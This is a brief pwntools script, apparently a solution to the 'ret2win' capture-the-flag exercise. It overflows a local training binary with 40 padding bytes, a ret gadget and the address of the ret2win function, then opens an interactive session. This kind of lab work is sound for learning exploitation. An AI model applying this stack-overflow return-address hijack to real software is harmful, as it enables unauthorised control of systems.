from pwn import *

p = process('./ret2win')

payload = b'A' * 40                    # offset 
payload += p64(0x000000000040053e)     # ret
payload += p64(0x00400756)             # ret2win()

p.sendlineafter(b'\n> ', payload)
p.interactive()
